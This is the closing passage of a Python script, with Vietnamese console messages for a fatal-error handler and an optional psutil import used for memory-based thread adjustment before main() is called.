        except Exception as e:
            console.print(f"[error]HỆ THỐNG: Lỗi nghiêm trọng: [bold red]{str(e)}[/] [error][✗][/]")
            exit(1)

if __name__ == "__main__":
    try:
        import psutil  # Optional: for memory-based thread adjustment
    except ImportError:
        console.print("[warning]HỆ THỐNG: Mô-đun psutil không được cài đặt. Sử dụng giá trị RAM mặc định. [warning][⚠][/]")
    main()
